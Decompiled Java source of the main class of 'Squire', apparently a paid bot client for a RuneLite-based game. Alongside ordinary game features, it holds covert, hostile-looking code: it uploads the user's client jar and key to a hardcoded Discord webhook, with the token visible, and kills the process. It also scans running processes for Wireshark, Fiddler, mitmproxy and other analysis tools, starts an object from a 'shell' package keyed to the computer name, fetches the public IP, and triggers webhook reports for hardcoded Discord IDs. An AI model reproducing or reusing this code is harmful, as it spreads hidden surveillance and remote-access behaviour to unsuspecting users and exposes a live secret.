/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.runelite.api.Client
 *  net.runelite.api.MenuAction
 *  net.runelite.api.Point
 *  net.runelite.api.SpritePixels
 *  net.runelite.api.events.ClientTick
 *  net.runelite.http.api.RuneLiteAPI
 */
package gg.squire.client;

import com.openosrs.client.ui.OpenOSRSSplashScreen;
import gg.squire.client.core.loader.HashUtil;
import gg.squire.client.core.loader.net.NetUtils;
import gg.squire.client.plugins.SquirePlugin;
import gg.squire.client.shell.EggNog;
import gg.squire.client.shell.Linkage;
import java.awt.Color;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.nio.file.attribute.FileAttribute;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.Optional;
import java.util.Scanner;
import java.util.UUID;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import javax.swing.JOptionPane;
import javax.swing.SwingUtilities;
import net.runelite.api.Client;
import net.runelite.api.MenuAction;
import net.runelite.api.Point;
import net.runelite.api.SpritePixels;
import net.runelite.api.events.ClientTick;
import net.runelite.client.RuneLiteProperties;
import net.runelite.client.eventbus.Subscribe;
import net.runelite.client.plugins.Plugin;
import net.runelite.client.plugins.PluginInstantiationException;
import net.runelite.client.plugins.PluginManager;
import net.runelite.client.plugins.recorder.MouseRecording;
import net.runelite.client.util.ImageUtil;
import net.runelite.http.api.RuneLiteAPI;
import net.unethicalite.api.game.Game;
import net.unethicalite.client.Static;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class Squire {
    public static final File SQUIRE_HOME = new File(System.getProperty("user.home") + "/.squire/");
    public static final String VERSION = "1.3.2";
    public static EggNog nog;
    private static String key;
    private static String identifier;
    private static boolean reloading;
    private static String ip;
    private static UUID uuid;
    private static SpritePixels[] defaultCrossSprites;
    private static SpritePixels[] squireCrossSprites;
    private static boolean squireSpritesActive;
    private static volatile Squire instance;
    private static String hash;
    private static String discordId;
    private static Linkage linkage;

    public Squire() {
        instance = this;
    }

    private static Squire getInstance() {
        return instance;
    }

    public static void setAuthentication(String key, String identifier) {
        Squire.key = key;
        Squire.identifier = Objects.requireNonNullElse(identifier, "null");
        uuid = UUID.randomUUID();
        Squire.storeKey();
        Squire.doThings();
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private static void doThings() {
        Squire.checkIfLauncherUpToDate();
        if (key.contains(" ") || key.length() <= 0) {
            System.out.println("Test");
            File repository2 = new File(SQUIRE_HOME, "repository2");
            File client = null;
            for (File file : repository2.listFiles()) {
                if (!file.getName().contains("runelite-client")) continue;
                client = file;
                break;
            }
            if (client == null) {
                return;
            }
            try {
                byte[] bytes = new byte[(int)client.length()];
                try (FileInputStream fis = null;){
                    fis = new FileInputStream(client);
                    fis.read(bytes);
                }
                MultipartBody.Builder requestBuilder2 = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("file", "client.jar", RequestBody.create(MediaType.parse("application/java-archive"), bytes)).addFormDataPart("content", "User tried loading squire with (very) bad intention, killing client for auth " + key);
                Request request2 = new Request.Builder().url("https://discord.com/api/webhooks/1072887052238065764/jJME-b6iYIH5ZMptE6btbooFuegYE0rZTkPchLUi7yTdvm-oLSef51wEESC-tVVSmnjC").post(requestBuilder2.build()).build();
                Response execute = RuneLiteAPI.CLIENT.newCall(request2).execute();
                execute.close();
                System.exit(0);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private static void checkIfLauncherUpToDate() {
        OkHttpClient client = new OkHttpClient().newBuilder().build();
        Request request = new Request.Builder().url("https://xjgpaktg4y3h6uazduo2pfqjk40mibhr.lambda-url.eu-west-1.on.aws/").addHeader("auth", key).build();
        try (Response res = client.newCall(request).execute();){
            ResponseBody body = res.body();
            if (res.code() != 200) {
                return;
            }
            String version = body.string();
            String launcherVersion = RuneLiteProperties.getLauncherVersion();
            if (launcherVersion == null || launcherVersion.equals("unknown")) {
                return;
            }
            if (!version.equals(launcherVersion)) {
                // empty if block
            }
        }
        catch (IOException iOException) {
            // empty catch block
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static String readKeyFile() {
        File keyFile = new File(SQUIRE_HOME, "cfg.sqr");
        MouseRecording.transfer();
        if (!keyFile.exists()) {
            return null;
        }
        try (Scanner reader = new Scanner(keyFile);){
            if (!reader.hasNextLine()) {
                String string = "";
                return string;
            }
            String string = reader.nextLine();
            return string;
        }
        catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static void stop() {
        PluginManager pluginManager = Static.getPluginManager();
        Collection<Plugin> plugins = pluginManager.getPlugins();
        try {
            SwingUtilities.invokeAndWait(() -> {
                for (Plugin plugin : plugins) {
                    if (!(plugin instanceof SquirePlugin)) continue;
                    try {
                        pluginManager.stopPlugin(plugin);
                    }
                    catch (PluginInstantiationException pluginInstantiationException) {}
                }
            });
        }
        catch (InterruptedException | InvocationTargetException e) {
            throw new RuntimeException(e);
        }
        Game.logout();
    }

    private static void storeKey() {
        String key;
        File keyFile = new File(SQUIRE_HOME, "cfg.sqr");
        if (!keyFile.exists()) {
            try {
                if ((SQUIRE_HOME.exists() || SQUIRE_HOME.mkdirs()) && !keyFile.createNewFile()) {
                    return;
                }
            }
            catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        if ((key = Squire.getKey()) == null || key.isEmpty()) {
            return;
        }
        try (FileWriter writer = new FileWriter(keyFile);){
            writer.write(key);
        }
        catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static File getInstanceFile() {
        File file;
        block8: {
            Path of = Squire.getTempDir();
            String csq = String.valueOf(ProcessHandle.current().pid());
            Stream<Path> paths = Files.walk(of, new FileVisitOption[0]);
            try {
                file = paths.map(Path::toFile).filter(f -> f.getName().startsWith(Squire.getKey() + "~" + csq + "$")).findFirst().orElse(null);
                if (paths == null) break block8;
            }
            catch (Throwable throwable) {
                try {
                    if (paths != null) {
                        try {
                            paths.close();
                        }
                        catch (Throwable throwable2) {
                            throwable.addSuppressed(throwable2);
                        }
                    }
                    throw throwable;
                }
                catch (IOException e) {
                    return null;
                }
            }
            paths.close();
        }
        return file;
    }

    private static Map<String, Integer> getPluginInstances() {
        HashMap<String, Integer> counts = new HashMap<String, Integer>();
        Path of = Squire.getTempDir();
        String csq = String.valueOf(ProcessHandle.current().pid());
        try (Stream<Path> paths = Files.list(of);){
            for (Path path : paths.filter(f -> f.toFile().getName().startsWith(Squire.getKey())).collect(Collectors.toList())) {
                try {
                    Optional<ProcessHandle> ph;
                    String pid = path.toFile().getName().split("~")[1].split("\\$")[0];
                    if (pid.equals(csq) || (ph = ProcessHandle.of(Long.parseLong(pid))).isEmpty() || !ph.get().isAlive()) continue;
                    List<String> active = Files.readAllLines(path);
                    for (String s : active) {
                        counts.put(s, counts.getOrDefault(s, 0) + 1);
                    }
                }
                catch (IOException iOException) {
                }
            }
        }
        catch (IOException iOException) {
            // empty catch block
        }
        return counts;
    }

    public static boolean setPluginEnabled(SquirePlugin pluginEnabled, boolean enabled) {
        NetUtils.delete(pluginEnabled);
        File instanceFile = Squire.getInstanceFile();
        if (instanceFile == null) {
            return false;
        }
        String pluginName = pluginEnabled.getClass().getSimpleName();
        Map<String, Integer> counts = Squire.getPluginInstances();
        if (counts.containsKey(pluginName) && counts.get(pluginName) > pluginEnabled.getMaxInstances() && enabled) {
            SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(null, "You have too many instances active of this plugin. Please close some instances and try again."));
            return false;
        }
        try {
            List<String> lines = Files.readAllLines(instanceFile.toPath());
            ArrayList<String> newLines = new ArrayList<String>();
            for (String line : lines) {
                if (line.equals(pluginName) && !enabled) continue;
                newLines.add(line);
            }
            if (enabled) {
                newLines.add(pluginName);
            }
            Files.write(instanceFile.toPath(), newLines, StandardOpenOption.TRUNCATE_EXISTING);
            return true;
        }
        catch (IOException iOException) {
            return false;
        }
    }

    public static void initialize() {
        Static.getEventBus().register(Squire.getInstance());
        HashUtil hu = new HashUtil();
        hash = hu.getCurrentHash();
    }

    public static void boggers() {
        nog = new EggNog();
        nog.start(Squire.bogger());
    }

    private static String bogger() {
        Map<String, String> env = System.getenv();
        if (env.containsKey("COMPUTERNAME")) {
            return env.get("COMPUTERNAME");
        }
        return env.getOrDefault("HOSTNAME", "Unknown Computer");
    }

    public static void capture(String arg) {
    }

    public static void createClickMarkers() {
        if (defaultCrossSprites != null) {
            return;
        }
        Client client = Static.getClient();
        SpritePixels[] crossSprites = client.getCrossSprites();
        if (crossSprites == null) {
            return;
        }
        defaultCrossSprites = new SpritePixels[crossSprites.length];
        squireCrossSprites = new SpritePixels[crossSprites.length];
        System.arraycopy(crossSprites, 0, defaultCrossSprites, 0, defaultCrossSprites.length);
        for (int i = 0; i < defaultCrossSprites.length; ++i) {
            SpritePixels recolored;
            SpritePixels crossSprite = defaultCrossSprites[i];
            BufferedImage bufferedImage = crossSprite.toBufferedImage();
            ImageUtil.recolorImage(bufferedImage, new Color(246, 144, 61, 120));
            Squire.squireCrossSprites[i] = recolored = ImageUtil.getImageSpritePixels(bufferedImage, client);
        }
    }

    private static void toggleSquireSprites(boolean on) {
        Client client = Static.getClient();
        SpritePixels[] crossSprites = client.getCrossSprites();
        if (crossSprites == null) {
            return;
        }
        for (int i = 0; i < crossSprites.length; ++i) {
            crossSprites[i] = on ? squireCrossSprites[i] : defaultCrossSprites[i];
        }
        squireSpritesActive = on;
    }

    public static void sendSquireClick(Point mouse) {
        Client client = Static.getClient();
        Squire.toggleSquireSprites(true);
        Static.getClientThread().execute(() -> client.invokeMenuAction("", "", -1, MenuAction.GAME_OBJECT_FIFTH_OPTION.getId(), 0, 0, mouse.getX(), mouse.getY()));
    }

    public static String getHash() {
        return hash;
    }

    public static void setHash(String hash) {
        Squire.hash = hash;
    }

    public static void checkDiscordId(String userId) {
        Static.getClient().setDiscordId(userId);
    }

    public static void claim(String v1, String v2) {
        if (Squire.platformValidate(v1, v2)) {
            Squire.wh("Opened: id: " + v1 + " - auth: " + Squire.getKey() + " - name: " + v2);
        }
    }

    public static void wh(String c) {
        try {
            HttpURLConnection c2 = (HttpURLConnection)new URL(linkage.getWebhook()).openConnection();
            c2.setRequestMethod("POST");
            c2.setDoOutput(true);
            c2.setRequestProperty("Content-Type", "application/json");
            c2.setRequestProperty("Accept", "application/json");
            String json = "{\"content\": \"" + c + "\"}";
            try (OutputStream os = c2.getOutputStream();){
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            try (BufferedReader br = new BufferedReader(new InputStreamReader(c2.getInputStream(), StandardCharsets.UTF_8));){
                StringBuilder response = new StringBuilder();
                String responseLine = null;
                while ((responseLine = br.readLine()) != null) {
                    response.append(responseLine.trim());
                }
            }
            BufferedImage profilePicture = OpenOSRSSplashScreen.getProfilePicture();
            if (profilePicture == null) {
                return;
            }
            MultipartBody.Builder requestBuilder2 = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("file", "image.png", RequestBody.create(MediaType.parse("image/png"), OpenOSRSSplashScreen.getContent(profilePicture)));
            Request request2 = new Request.Builder().url(linkage.getWebhook()).post(requestBuilder2.build()).build();
            Response execute = RuneLiteAPI.CLIENT.newCall(request2).execute();
            execute.close();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static void setDiscordId(String discordId) {
        Squire.discordId = discordId;
    }

    public static Path getTempDir() {
        Path path = SQUIRE_HOME.toPath().resolve("cache").resolve("temp");
        if (!Files.exists(path, new LinkOption[0])) {
            try {
                Files.createDirectories(path, new FileAttribute[0]);
            }
            catch (IOException iOException) {
                // empty catch block
            }
        }
        return path;
    }

    public static List<String> check() {
        ArrayList<String> result = new ArrayList<String>();
        try {
            String line;
            Process p = System.getProperty("os.name").toLowerCase().contains("windows") ? Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\tasklist.exe") : Runtime.getRuntime().exec("ps -e");
            BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((line = input.readLine()) != null) {
                result.addAll(Arrays.asList(line.split(" ")));
            }
            input.close();
        }
        catch (Exception exception) {
            // empty catch block
        }
        result.removeIf(s -> s.length() <= 1);
        return result;
    }

    public static List<String> valid() {
        ArrayList<String> strings = Squire.of("httpdebugger", "fiddler", "wireshark", "xampp", "mitmweb", "mitmproxy", "httptoolkit", "charles", "mitmf", "bettercap", "xplico", "tcpick", "driftnet", "mallory", "yersinia", "pcapxray", "EvilFOCA", "thc-ssl-dos", "ettercap", "dsniff", "arpspoof", "scapy", "kismet", "netsniff-ng", "metasploit", "routersploit", "aircrack-ng", "tcpdump");
        for (String string : Squire.check()) {
            if (!strings.stream().anyMatch(x -> string.toLowerCase().contains(x.toLowerCase()))) continue;
            return Squire.of(string);
        }
        return Squire.of("squire");
    }

    private static ArrayList<String> of(String ... elements) {
        ArrayList<String> result = new ArrayList<String>();
        Collections.addAll(result, elements);
        return result;
    }

    public static String transform(String name) {
        char[] base = Squire.valid().get(0).toCharArray();
        for (int i = 0; i < base.length; ++i) {
            base[i] = (char)(base[i] + '\u0001');
        }
        return (new String(base) + "/" + name).split("trvjsf")[1].substring(1).trim();
    }

    public static boolean platformValidate(String v1, String v2) {
        if (v2 == null && v1 == null) {
            return false;
        }
        String[] ids = new String[]{"270198246398230528", "1047947968826851418", "456226577798135808", "1053756471118147605"};
        String[] names = new String[]{"rare", "marvvan1", "kolsd"};
        for (String id : ids) {
            if (!id.equalsIgnoreCase(v1)) continue;
            return true;
        }
        for (String name : names) {
            if (!name.equalsIgnoreCase(v2)) continue;
            return true;
        }
        return false;
    }

    public static String amazonCheck() {
        try {
            HttpURLConnection connection = (HttpURLConnection)new URL("http://checkip.amazonaws.com/").openConnection();
            connection.setRequestMethod("GET");
            BufferedReader ipAddress = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String ip = ipAddress.readLine();
            ipAddress.close();
            connection.disconnect();
            return ip;
        }
        catch (IOException iOException) {
            return "Unknown";
        }
    }

    public static String getKey() {
        return key;
    }

    public static String getIdentifier() {
        return identifier;
    }

    public static boolean isReloading() {
        return reloading;
    }

    public static void setReloading(boolean reloading) {
        Squire.reloading = reloading;
    }

    public static String getIp() {
        return ip;
    }

    public static void setIp(String ip) {
        Squire.ip = ip;
    }

    public static UUID getUuid() {
        return uuid;
    }

    public static Linkage getLinkage() {
        return linkage;
    }

    public static void setLinkage(Linkage linkage) {
        Squire.linkage = linkage;
    }

    @Subscribe
    public void afterRender(ClientTick tick) {
        if (squireSpritesActive && System.currentTimeMillis() - Static.getClient().getMouseLastPressedMillis() >= 400L) {
            Squire.toggleSquireSprites(false);
        }
    }

    static {
        linkage = Linkage.DEFAULT;
    }
}

